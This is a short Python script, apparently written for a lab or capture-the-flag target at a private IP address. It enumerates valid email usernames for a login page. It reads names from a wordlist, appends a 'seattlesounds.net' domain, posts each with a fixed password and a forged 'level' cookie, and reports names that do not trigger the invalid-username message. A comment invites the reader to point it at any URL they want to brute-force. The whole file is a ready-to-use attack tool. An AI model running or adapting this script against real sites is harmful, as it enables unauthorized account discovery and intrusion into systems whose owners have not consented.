import requests

wordfile = "/pw.txt"
wd = open(wordfile) 
match='Invalid username, please try again.'
#entry = 'admin@seattlesounds.net'
#entry = entry.rstrip("\n") 
mail = '@seattlesounds.net' 
password = 'random' 
url = "http://192.168.0.4/login.php" #Change URL to be the URL you are trying to bruteforce

i=0

for entry in wd:
        entry = entry.rstrip("\n")
        entry = entry + mail

        #data to be include when requesting 
        datas = {'password':password,'usermail':entry}
        #cookie to be include when requesting 
        cookie = {'level':'1'}
        request = requests.post(url, data = datas, cookies = cookie).text

        if match not in request:
                print(entry,': login correct')

        i=i+1
        if i%1000==0:
                print('Line',i)
